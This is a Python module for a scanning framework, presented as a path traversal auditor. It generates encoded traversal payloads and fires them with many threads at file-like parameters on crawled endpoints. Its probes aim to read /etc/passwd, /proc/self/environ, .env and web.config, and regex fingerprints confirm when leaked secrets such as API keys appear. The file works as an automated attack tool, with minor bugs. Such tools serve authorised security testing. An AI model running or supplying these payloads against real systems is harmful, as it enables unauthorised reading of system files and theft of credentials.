import json
import re
import time
import threading
import urllib.parse
import urllib.request
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Any
from hellhound.core import http_utils

NAME = "PATHtraveller"
CATEGORY = "vuln"
DESCRIPTION = "Universal 6-Tier Path Traversal & File System Escape Auditor"

# Module Options
OPTIONS = [
    {"name": "threads",   "default": 10, "required": False, "help": "Concurrent test threads"},
    {"name": "depth",     "default": 3,  "required": False, "help": "Crawler depth for discovery"},
    {"name": "timeout",   "default": 12, "required": False, "help": "HTTP timeout in seconds"},
    {"name": "force_os",  "choices": ["linux", "windows"], "default": None, "help": "Override OS detection"},
    {"name": "web_root_probes", "type": bool, "default": False, "help": "Include .env/web.config probes"},
    {"name": "min_score", "default": 1, "required": False, "help": "Min param score (0=all, 1=med, 3=high)"},
    {"name": "verbose",   "type": bool, "default": False, "help": "Verbose injection details"}
]

# ─────────────────────────────────────────────────────────────────────────────
# OS-AWARE PROBE FILES & PATTERNS
# ─────────────────────────────────────────────────────────────────────────────

LINUX_PROBES = ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ"]
WINDOWS_PROBES = ["C:/Windows/win.ini", "C:/boot.ini", "C:/Windows/System32/drivers/etc/hosts"]
WEB_ROOT_PROBES = [".env", "web.config", "config.php", ".htaccess", "settings.py"]

FINGERPRINTS = {
    "linux_passwd": re.compile(r"[a-z_][a-z0-9_\-.]{0,31}:[x*!Uu]?\d*:\d+:\d+:.*:.*:/", re.M),
    "linux_hosts":  re.compile(r"127\.0\.0\.1\s+localhost", re.I),
    "win_ini":      re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I),
    "win_boot":     re.compile(r"\[boot loader\]|timeout=\d+", re.I),
    "dotenv":       re.compile(r"(?:DB_HOST|APP_KEY|SECRET_KEY|API_KEY)=", re.I)
}

# Payload Tier config
TRAVERSAL_DEPTHS = [3, 5, 7, 9]

# ─────────────────────────────────────────────────────────────────────────────
# CORE LOGIC
# ─────────────────────────────────────────────────────────────────────────────

class TraversalEngine:
    def __init__(self, emit, options, sessions):
        self.emit = emit
        self.options = options
        self.sessions = sessions
        self.findings = []
        self._lock = threading.Lock()
        self.verbose = options.get("verbose", False)

    def _build_payloads(self, probe_file, os_type):
        """Constructs the 6-tier payload matrix."""
        payloads = []
        pf = probe_file.lstrip("/")
        for depth in TRAVERSAL_DEPTHS:
            # Tier 1: Basic
            payloads.append({"p": "../" * depth + pf, "t": 1, "l": "Basic ../"})
            # Tier 2: URL Encoded
            payloads.append({"p": "..%2f" * depth + pf, "t": 2, "l": "URL-encoded ..%2f"})
            # Tier 3: Double Encoded
            payloads.append({"p": "..%252f" * depth + pf, "t": 3, "l": "Double-encoded ..%252f"})
            # Tier 4: Unicode
            payloads.append({"p": "..%c0%af" * depth + pf, "t": 4, "l": "Unicode overlong"})
            # Tier 5: Windows backslash
            payloads.append({"p": "..\\" * depth + pf.replace("/", "\\"), "t": 5, "l": "Windows ..\\\\"})
            # Tier 6: Null-byte
            payloads.append({"p": "../" * depth + pf + "%00", "t": 6, "l": "Null-terminate %00"})
        return payloads

    def audit_param(self, ep_url, method, param, probe_files, os_type):
        """Tests one parameter across the matrix."""
        for pf in probe_files:
            payloads = self._build_payloads(pf, os_type)
            for pl in payloads:
                try:
                    p_val = pl["p"]
                    if method == "GET":
                        url = f"{ep_url}{'&' if '?' in ep_url else '?'}{param}={p_val}"
                        r = self.sessions["default"].get(url, timeout=10)
                    else:
                        r = self.sessions["default"].post(ep_url, data={param: p_val}, timeout=10)
                    
                    if r.status_code == 200 and r.text:
                        for name, regex in FINGERPRINTS.items():
                            if regex.search(r.text):
                                self._add_finding(ep_url, method, param, p_val, pf, pl["l"], name, r.text[:100])
                                return # Move to next param
                except: continue

    def _add_finding(self, url, method, param, payload, pf, label, pattern, snippet):
        with self._lock:
            # Avoid duplicate findings for the same endpoint/param
            if any(f["endpoint"] == url and f["parameter"] == param for f in self.findings): return
            
            finding = {
                "vulnerability": "Path Traversal",
                "severity": "High" if "passwd" in pf or "dotenv" in pf else "Medium",
                "endpoint": url,
                "parameter": param,
                "payload": payload,
                "file_accessed": pf,
                "details": f"Successfully accessed {pf} via {label}",
                "repro_data": {"url": url, "method": method, "headers": {}, "params": {param: payload}} if method == "GET" else {"url": url, "method": method, "headers": {}, "data": {param: payload}}
            }
            # Special case for reproduction engine params
            if method == "GET" and "?" in url:
                # Need to strip the injected param from the base URL for repro
                base, qs = url.split("?", 1)
                finding["repro_data"]["url"] = base
            
            self.findings.append(finding)
            self.emit.warn(f"    [!] Discovery: {finding['severity']} - Path Traversal @ {param}")

def run(target: str, emit, options: Optional[Dict[str, Any]] = None):
    emit.info(f"[*] PATHtraveller 6-Tier Auditor: {target}")
    opt = options or {}
    
    # Setup session
    session = requests.Session()
    session.verify = False
    http_utils.apply_session_config(session, opt)
    sessions = {"default": session}
    
    # OS Detection
    os_type = opt.get("force_os", "linux") # Simple default or detection logic
    emit.info(f"    [*] Target OS: {os_type}")
    
    # Probe selection
    probes = LINUX_PROBES if os_type == "linux" else WINDOWS_PROBES
    if opt.get("web_root_probes"): probes += WEB_ROOT_PROBES
    
    # Surface selection
    spider_intel = opt.get("spider_intel", {})
    all_eps = spider_intel.get("endpoints", [])
    
    candidate_params = []
    for ep in all_eps:
        url = ep.get("url")
        params = ep.get("params", {}).get("query", []) + ep.get("params", {}).get("form", [])
        for p in params:
            if p and any(kw in p.lower() for kw in ("file", "path", "lang", "template", "src", "include")):
                candidate_params.append((url, ep.get("method", "GET"), p))
    
    if not candidate_params:
        emit.info("[-] No file-candidate parameters found.")
        return {"raw": "0 findings", "intel": {}, "risk_score": 0}

    engine = TraversalEngine(emit, opt, sessions)
    threads = int(opt.get("threads", 10))
    emit.info(f"    [i] Auditing {len(candidate_params)} parameters using {threads} threads...")
    
    with ThreadPoolExecutor(max_workers=threads) as pool:
        for url, method, param in candidate_params:
            pool.submit(engine.audit_param, url, method, param, probes, os_type)

    if not engine.findings:
        emit.info("[-] No path traversal vulnerabilities discovered.")
        return {"raw": "0 findings", "intel": {}, "risk_score": 0}

    risk_score = min(100, sum(20 for _ in engine.findings))
    return {
        "raw": f"Discovered {len(engine.findings)} path traversal vulnerabilities.",
        "intel": {"vulnerabilities": engine.findings, "risk_score": risk_score},
        "risk_score": risk_score
    }

import requests # needed for session